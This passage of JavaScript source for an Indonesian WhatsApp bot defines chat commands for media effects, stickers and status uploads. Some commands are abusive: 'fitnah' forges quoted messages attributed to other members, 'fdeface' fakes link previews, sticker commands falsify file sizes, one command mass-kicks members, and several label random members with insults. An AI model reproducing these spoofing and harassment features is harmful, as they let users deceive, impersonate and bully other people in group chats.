           // if (args.length < 2) return setReply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join(" ")
            mentioned = iky.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            ikyc.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            } catch (err){
            	setReply(`Error ngab, penggunaan :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            }
            break
    
            
    case 'tomp3':
            if (!isQuotedVideo) return setReply('Reply videonya!')
            setReply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await ikyc.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            ikyc.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: iky })
            fs.unlinkSync(ran)
            })
            break
            
    case 'fast':
            if (!isQuotedVideo) return setReply('Reply videonya!')
            setReply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await ikyc.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            ikyc.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: iky })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':  
            if (!isQuotedVideo) return setReply('Reply videonya!')
            setReply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await ikyc.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            ikyc.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: iky })
            fs.unlinkSync(ran)
            })
            break
//kymenu
 case 'vganteng': case 'vcantik': case 'vjelek': case 'vgoblok':  
            case 'vbego': case 'vpintar': case 'vjago': case 'vnolep': case 'vmonyet':                 	 
            case 'vbabi': case 'vbeban': case 'vbaik': case 'vjahat': case 'vanjing': 
            case 'vharam': case 'vkontol': case 'vpakboy': case 'vpakgirl': 
            case 'vwibu': case 'vhebat': case 'vsadboy': case 'vsadgirl':			
			if (!isGroup) return reply("ONLY GRUP")
 		    jds = []
		    const AS1 = groupMembers
 		    const CS1 = AS1[Math.floor(Math.random() * AS1.length)]	 	                      
 		    const vcardd = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n' 
            + `FN:${command1}\n` 
            + `ORG: Yang Ter ${command1};\n`
            + `TEL;type=CELL;type=VOICE;waid=${CS1.jid.split('@')[0]}:+${CS1.jid.split('@')[0]}\n`
            + 'END:VCARD' 
            ikyc.sendMessage(from, {displayname: "NIH", vcard: vcardd}, MessageType.contact, { quoted: iky})
            reply(`Tuh Kontak Yang *ter-${command1}* Disini`)			
	 	    break
case 'zganteng': case 'zcantik': case 'zjelek': case 'zgoblok':  
            case 'zbego': case 'zpintar': case 'zjago': case 'znolep': case 'zmonyet':                 	 
            case 'zbabi': case 'zbeban': case 'zbaik': case 'zjahat': case 'zanjing': 
            case 'zharam': case 'zkontol': case 'zpakboy': case 'zpakgirl': 
            case 'zwibu': case 'zhebat': case 'zsadboy': case 'zsadgirl':
            nyy = fs.readFileSync('./ztag.webp')
           	if (!isGroup) return reply("ONLY GRUB") 	 
		    const AS11 = groupMembers		     
 		    const CS21 = AS11[Math.floor(Math.random() * AS11.length)]	 	    		     
			ikyc.sendMessage(from, nyy, sticker, {quoted: { key: { fromMe: false, participant: `${CS21.jid.split('@')[0]}@s.whatsapp.net`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `aku adalah yang *ter${command1}* disini` }}})
			break    	 	     
				 case '10tb':
filsize = 9999999999999
costick = await ikyc.prepareMessageFromContent(from,{
"stickerMessage": {
"url": iky.quoted.url,
"fileSha256": iky.quoted.fileSha256.toString('base64'),
"fileEncSha256": iky.quoted.fileEncSha256.toString('base64'),
"mediaKey": iky.quoted.mediaKey.toString('base64'),
"mimetype": iky.quoted.mimetype,
"height": iky.quoted.height,
"width": iky.quoted.width,
"directPath": iky.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": iky.quoted.mediaKeyTimestamp.low,
"isAnimated": iky.quoted.isAnimated
}
}, {quoted:iky})
ikyc.relayWAMessage(costick)
break
case 'size':
if (args.length < 1) return reply('Masukan angkanya')
filsize = args[0]
costick = await ikyc.prepareMessageFromContent(from,{
"stickerMessage": {
"url": iky.quoted.url,
"fileSha256": iky.quoted.fileSha256.toString('base64'),
"fileEncSha256": iky.quoted.fileEncSha256.toString('base64'),
"mediaKey": iky.quoted.mediaKey.toString('base64'),
"mimetype": iky.quoted.mimetype,
"height": iky.quoted.height,
"width": iky.quoted.width,
"directPath": iky.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": iky.quoted.mediaKeyTimestamp.low,
"isAnimated": iky.quoted.isAnimated
}
}, {quoted:iky})
ikyc.relayWAMessage(costick)
await limitAdd(sender, limit)
					break   
					case 'ow':
if (args.length < 1) return reply('Masukan angkanya')
filsize = args[0]
costick = await ikyc.prepareMessageFromContent(from,{
"stickerMessage": {
"url": iky.quoted.url,
"fileSha256": iky.quoted.fileSha256.toString('base64'),
"fileEncSha256": iky.quoted.fileEncSha256.toString('base64'),
"mediaKey": iky.quoted.mediaKey.toString('base64'),
"mimetype": iky.quoted.mimetype,
"height": iky.quoted.height,
"width": iky.quoted.width,
"directPath": iky.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": iky.quoted.mediaKeyTimestamp.low,
"isAnimated": iky.quoted.isAnimated
}
}, {quoted:iky})
ikyc.relayWAMessage(costick)
await limitAdd(sender, limit)
					break   
case 'spamsw':
if (!isOwner && !iky.key.fromMe) return reply(`Khusus Owner Om`)
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					ikyc.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break
          case 'tagall1':
					if (!isGroup) return reply(mess.only.group)
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `*╠➥* @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break
					case 'tagall2':
					if (!isGroup) return reply(mess.only.group)
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `*${prefix}* https://wa.me/${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break	
				case 'upswteks':
if (!isOwner && !iky.key.fromMe) return reply(`Khusus Owner Om`)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    ikyc.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
if (!isOwner && !iky.key.fromMe) return reply(`Khusus Owner Om`)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    ikyc.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`Yuki ゑ`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':
                    if (!isOwner && !iky.key.fromMe) return reply(`Khusus Owner Om`)
if (!isQuotedSticker) return reply('reply stikernya!')
if (isMedia && !iky.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						ikyc.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case 'upswaudio':
                    if (!isOwner && !iky.key.fromMe) return reply(`Khusus Owner Om`)
if (!isQuotedAudio) return reply('reply audionya!')
if (isMedia && !iky.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						ikyc.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvoice':
                    if (!isOwner && !iky.key.fromMe) return reply(`Khusus Owner Om`)
if (!isQuotedAudio) return reply('reply audionya!')
if (isMedia && !iky.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						ikyc.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
case 'upswvideo':
if (!isOwner && !iky.key.fromMe) return reply(`Khusus Owner Om`)
                    var konti = body.slice(11)
                    reply(`Bentar Nyett....`)
                    var enmediap = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await ikyc.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    ikyc.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                           case 'upswgif':
if (!isOwner && !iky.key.fromMe) return reply(`Khusus Owner Om`)
                    var konti = body.slice(7)
                    reply(`Bentar Nyett....`)
                    enmedia = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await ikyc.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    ikyc.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner && !iky.key.fromMe) return reply(`Khusus Owner Om`)
                    var teksyy = body.slice(11)
                    reply(`Bentar Nyett....`)
                    enmedia = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await ikyc.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    ikyc.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: iky, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
					case 'shutdown':
					if (!isOwner && !iky.key.fromMe) return reply(`Khusus Owner Om`)
				return ikyc.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Okey')
				break	
case "clearmember":
           if(!isGroupAdmins && !iky.key.fromMe) return ikyc.sendMessage(from, "```only bot owner```", MessageType.text) 
        ikyc.sendMessage(from, "```Please wait```", MessageType.text, {
            quoted: {
                key: {
                    fromMe: false,
                    remoteJid: "0" + "@s.whatsapp.net",
                },
                message: {
                    conversation: "```Prepare for Clear Member```",
                },
            },
        });
		const metadata = isGroup ? await ikyc.groupMetadata(from) : "";
        const partc = metadata.participants ? metadata.participants : [];
        let mid = [];
        for (let memb of partc) {
            mid.push(memb.jid);
        }
        let u = mid.length;
        for (let i = 0; i < mid.length; i++) {
            if (groupAdmins.includes(mid[i])) {
                console.log("Cannot kick admin " + mid[i]);
            } else {
                ikyc.groupRemove(from, [mid[i]]);
               console.log("kicking " + mid[i] + `${i+1}`)
            }
        }
        await sleep(1000);
        ikyc.sendMessage(from, "```Clearl Done.\nTotal before: " + u + "\nTotal after: " + groupAdmins.length + "```", MessageType.text);
    break     
case "s1": case "s2": case "s3":  case "s4":  case "s5":  case "s6":  case "s7":  case "s8":  case "s9": case "s10": case "s11": case "s12":  case "s13": case "s14": case "s15": case "s16": case "s17": case "s18": case "s19": case "s20": case "s21": case "s22": case "s23":  case "s24": case "s25": case "s26": case "s27": case "s28": case "s29": case "s30": case "s31": case "s32": case "s33": case "s34":  case "s35": case "s36": case "s37": case "s38": case "s39": case "s40": case "s41": case "s42": case "s43": case "s44": case "s45":  case "s46": case "s47": case "s48": case "s49": case "s50":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync(`./30detik/${command}.mp3`);
ikyc.sendMessage(from, satu7, MessageType.audio, {quoted: iky, mimetype: 'audio/mp4', ptt:true})
break
case "p":
if(!isGroupAdmins && !iky.key.fromMe) return ikyc.sendMessage(from, "```only bot owner```", MessageType.text) 
ikyc.sendMessage("6289699472590@s.whatsapp.net", from, MessageType.text);
break
  if(!isQuotedAudio) return setReply('Reply audionya')
            setReply(mess.wait)
					encmedia5 = isQuotedAudio ? JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo : iky
					medok = await ikyc.downloadAndSaveMediaMessage(encmedia5)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(medok)
						if (err) return setReply('Error!')
						buffer453 = fs.readFileSync(ran)
						ikyc.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt: true, quoted: iky})
						fs.unlinkSync(ran)
					})
				break
            
            case 'ghost':
if(!isQuotedAudio) return setReply('Reply audionya')
            setReply(mess.wait)
					encmedia2 = isQuotedAudio ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
					mele = await ikyc.downloadAndSaveMediaMessage(encmedia2)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(mele)
					if (err) return setReply('Error!')
					buffer453 = fs.readFileSync(ran)
					ikyc.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : iky})
                    fs.unlinkSync(ran)
				    })
		            break



case 'nightcore':
if(!isQuotedAudio) return setReply('Reply audionya')
setReply(mess.wait)
					encmedia4 = isQuotedAudio ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
					mela = await ikyc.downloadAndSaveMediaMessage(encmedia4)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mela} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mela)
						if (err) return setReply('Error!')
						buffer453 = fs.readFileSync(ran)
						ikyc.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : iky})
						fs.unlinkSync(ran)
					   })
				       break



case 'tupai':
if(!isQuotedAudio) return setReply('Reply audionya')
				setReply(mess.wait)
					mesi = isQuotedAudio ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
					medoi = await ikyc.downloadAndSaveMediaMessage(mesi)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(medoi)
						if (err) return setReply('Error!')
						buffer453 = fs.readFileSync(ran)
						ikyc.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : iky})
						fs.unlinkSync(ran)
					})
				break
case 'vibra': case 'vibrato':{
									encmedia = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await ikyc.downloadAndSaveMediaMessage(encmedia)
									ran = getRandom('.mp3')
									exec(`ffmpeg -i ${media} -filter_complex "vibrato=f=16" ${ran}`, (err, stderr, stdout) => {
										fs.unlinkSync(media)
										if (err) return reply('Error!')
										hah = fs.readFileSync(ran)
										ikyc.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: iky})
										fs.unlinkSync(ran)
										})
										}
									break
case 'imut':
if(!isQuotedAudio) return setReply('Reply audionya')
setReply(mess.wait)
	 ahu = isQuotedAudio ? JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo : iky 
	masa = await ikyc.downloadAndSaveMediaMessage(ahu)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(masa)
if (err) return setReply('Error!')
buffer453 = fs.readFileSync(ran)
ikyc.sendMessage(from, buffer453, audio, { mimetype: "audio/mp4", ptt: true, quoted: iky})
fs.unlinkSync(ran)})
break

            
case 'hode':
  if(!isQuotedAudio) return setReply('Reply audionya')
            setReply(mess.wait)
					encmedia5 = isQuotedAudio ? JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo : iky
					medok = await ikyc.downloadAndSaveMediaMessage(encmedia5)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(medok)
						if (err) return setReply('Error!')
						buffer453 = fs.readFileSync(ran)
						ikyc.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt: true, quoted: iky})
						fs.unlinkSync(ran)
					})
				break
                                  
                      
                      
                      
                      
                      
      
            
            
            
     

      
       
      
        case 'listrespon':{
          let txt = `List Respon\nTotal : ${commandsDB.length}\n\n`
          for (let i = 0; i < commandsDB.length; i++){
          txt += `❏ Key : ${commandsDB[i].pesan}\n`
          }
          setReply(txt)
          }
        break
        
        
    case 'reverse':
            if (!isQuotedVideo) return setReply('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await ikyc.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            ikyc.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: iky })
            fs.unlinkSync(ran)
            })
            break
    

case 'sc':
case 'src':
case 'scrip':
case 'sourcecode':
if (isBanned) return reply(mess.ban)
woyl = `
𝚂𝚌𝚛𝚒𝚙 𝙼𝚊𝚍𝚎 𝙱𝚢 𝙸𝚔𝚢 𝙱𝚘𝚝
𝙾𝚠𝚗𝚎𝚛 : ©𝙸𝚔𝚢𝚢𝚢
𝙱𝚊𝚑𝚊𝚜𝚊 : 𝙹𝚊𝚟𝚊𝚂𝚌𝚛𝚒𝚙
`;
        sendButLocation(from, woyl, "IkyBotz 3.0.1 | Create By Ikyyys Botz \nLet's Be Happy Together <3", donh, [
          {
            buttonId: `${prefix}owner`,
            buttonText: {
              displayText: ` 𝘖𝘸𝘯𝘦𝘳 🚇`,
            },
            type: 1,
          },         
        {
            buttonId: `${prefix}menu`,
            buttonText: {
              displayText: ` 𝘉𝘢𝘤𝘬 🏯`,
            },
            type: 1,
          },
        ]);
        break
case 'style':
				  if(!q) return setReply('Masukkan teks!')
         setReply(mess.wait)
			axios.get(`https://kocakz.herokuapp.com/api/random/text/fancytext?text=${body.slice(7)}`).then((res) => {
      let hasil = `*Hasil* :\n${res.data.result}`;
      ikyc.sendMessage(from, hasil, MessageType.text, { quoted: iky});
    })
break
case 'pastebin':
if(!q) return setReply(`Contoh ${prefix}pastebin Zadani`)
yamete = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${q}`, {method: 'get'})
                   ikyc.sendMessage(from, `${yamete.result}`, text, {quoted: setQuoted})
                     break
                     
     


                
    case 'anime':
     if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            ikyc.sendMessage(from,media,image,{quoted:iky,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
            
    case 'kontak':
    if(!q) return setReply(`penggunaan ${prefix}kontak nomor| nama`)
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return setReply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            ikyc.sendMessage(from, {displayName: `${pushname}`, vcard: vcard}, contact)            
            case 'getname':
            if (iky.message.extendedTextMessage === undefined || iky.message.extendedTextMessage === null) return setReply('Reply targetnya!')
            if(isGroup) {
        var ambl = iky.message.extendedTextMessage.contextInfo.participant
const sname = ikyc.contacts[ambl] != undefined ? ikyc.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : ikyc.contacts[ambl].notify || ikyc.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
setReply(sname)
}else {
const yahu = ikyc.contacts[from] != undefined ? ikyc.contacts[from].notify = undefined ? PhoneNumber('+' + from.replace('@s.whatsapp.net', '')).getNumber('international') : ikyc.contacts[from].notify || ikyc.contacts[from].vname : PhoneNumber('+' + from.replace('@s.whatsapp.net', '')).getNumber('international')
setReply(yahu)
}
break
            
            
    case 'take':
    case 'colong':
    		if (!isQuotedSticker) return setReply(`Reply stickernya denya ${prefix}take Wawan|suka makan`)
            encmedia = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await ikyc.downloadAndSaveMediaMessage(encmedia)
            ahuh = args.join(' ').split('|')
            satu = ahuh[0] !== '' ? ahuh[0] : `Zadani`
            dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, ikyc, iky, from)
			break
				 
  case "fdeface":
        if (isBanned) return reply(mess.ban)
        ge = args.join("");
        var pe = ge.split("|")[0];
        var pen = ge.split("|")[1];
        var pn = ge.split("|")[2];
        var be = ge.split("|")[3];
        const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`;
        if (args.length < 1) return reply(fde);
        const dipes =
          isQuotedSticker || isQuotedImage
            ? JSON.parse(JSON.stringify(iky).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : iky;
        const tipes = await ikyc.downloadAndSaveMediaMessage(dipes);
        const bufer = fs.readFileSync(tipes);
        const desc = `${pn}`;
        const title = `${pen}`;
        const url = `${pe}`;
        const buu = `https://${be}`;
        var woy = {
          detectLinks: false,
        };
        var mat = await ikyc.generateLinkPreview(url);
        mat.title = title;
        mat.description = desc;
        mat.jpegThumbnail = bufer;
        mat.canonicalUrl = buu;
        ikyc.sendMessage(from, mat, MessageType.extendedText, anu);
        break;

		
			
				
			        
				
				     
				
				
				
				
				
				
				
				case 'delerror':
				case 'delror':
					if (!iky.key.fromMe && !isOwner) return reply (mess.owner)
					try {
					 listerror.splice(q, 1)
					fs.writeFileSync('./database/listerror.json', JSON.stringify(listerror))
					await ikyc.sendMessage(from, `Sukses menghapus ${q} di daftar error`, text)
					} catch (err){
						console.log(err)
						setReply('eror kak')
					}
					break
				
				
				
				case 'addmusik':
				{
				
				if (!iky.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedAudio) return setReply('Reply musik')
				if (!q) return setReply('Nama musiknya apa')
				boij = JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await ikyc.downloadMediaMessage(boij)
				musiknye.push(q)
				fs.writeFileSync(`./temp/musik/${q}.mp3`, delb)
				fs.writeFileSync('./temp/music.json', JSON.stringify(musiknye))
				await ikyc.sendMessage(from, `Sukses Menambahkan musik\nCek dengan cara ${prefix}musik`, MessageType.text, { quoted: iky})
				}
				break
				
				
				
				
				case 'delmusik':
					if (!isOwner) return onlyOwner() 
					try {
				await setReply(mess.wait)
					 wanu = audionye.indexOf(q)
					 musiknye.splice(wanu, 1)
					 fs.unlinkSync(`./temp/musik/${q}.mp3`)
					fs.writeFileSync('./temp/music.json', JSON.stringify(musiknye))
					await ikyc.sendMessage(from, `Sukses menghapus musik ${q}`, text)
					} catch (err){
						console.log(err)
						setReply('eror kak')
					}
					break
				
				
				
				
				
				case 'delvn':
					if (!isOwner) return onlyOwner() 
					try {
					 wanu = audionye.indexOf(q)
					 audionye.splice(wanu, 1)
					fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				    fs.unlinkSync(`./temp/audio/${q}.mp3`)
					ikyc.sendMessage(from, 'Sukses', text)
					} catch (err){
						console.log(err)
						setReply('eror kak')
					}
					break
					
					
					
				case 'restart':
if (!isOwner && !iky.key.fromMe) return setReply("Khusus Owner")
await setReply(`Succes restarting`)
exec(`node main`)
break
	
			
				
				case 'liststik':
				teks = '*Sticker list :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*`
				ikyc.sendMessage(from, teks.trim(), extendedText, { quoted: iky, contextInfo: { "mentionedJid": setiker } })
				break
				
				case 'listimg':
				teks = '*Image list :*\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${imagenye.length}*`
				ikyc.sendMessage(from, teks.trim(), extendedText, { quoted: iky, contextInfo: { "mentionedJid": setiker } })
				break
				
				case 'listvid':
				  case 'listvideo':
				teks = '*List Video :*\n\n'
				for (let awokwkwk of videonye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${videonye.length}* `
				ikyc.sendMessage(from, teks.trim(), extendedText, { quoted: iky, contextInfo: { "mentionedJid": imagenye } })
				break
				
				case 'listvn':
			case 'vnlist':
				teks = '*List Vn:*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total ada : ${audionye.length}*`
				teks += `\n\n*Untuk mengambil vn silakan ketik nama vn*`
				ikyc.sendMessage(from, teks.trim(), extendedText, { quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': thumb }}}, contextInfo: forward })
				break
				
				
				
				
				
				
				
		    case 'listmusik':
			case 'musiklist':
			case 'musik':
				teks = '*List Musik:*\n\n'
				for (let awokwkwk of musiknye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total ada : ${musiknye.length}*`
				teks += `\n\n*Untuk mengambil musik silakan ketik nama musik*`
				
				
    const rows2 = [{
        "title": 'Hello Mother F',
        "rowId": '0'
    }, {
        "title": 'ASADE',
        "rowId": '0'
    },{
        "title": 'Sugar Crash',
        "rowId": '0'
    }, {
        "title": 'Ring Ring You',
        "rowId": '0'
    },{
        "title": 'DJ CAMPURAN',
        "rowId": '0'
    },{
        "title": 'DJ OPUS',
        "rowId": '0'
    }];
    const sections2 = [{
        title: 'Pilih salah satu',
        rows: rows2
    }];
    const listt2 = {
        buttonText: 'SELECT HERE',
        title: `*Cek musik di sini*`,
        description: `Bisa di ketik atau di klik disini`,
        footerText: `Fitur ini masih uji coba`,
        sections: sections2,
        listType: 1
    };
    ikyc.sendMessage(from, teks.trim(), extendedText, { quoted: setQuoted, contextInfo: forward })
    ikyc.sendMessage(from, listt2, MessageType.listMessage, {
        contextInfo: {
            "mentionedJid": [sender]
        }
    })
break	
    case "sticker":
      case "stiker":
      case "sg":
      case "s":
        if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !iky.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(iky).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : iky;
          const media = await ikyc.downloadAndSaveMediaMessage(encmedia);
          ran = "666.webp";
          await ffmpeg(`./${media}`)
            .input(media)
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              reply("error");
            })
            .on("end", function () {
              console.log("Finish");
              ikyc.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: iky,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
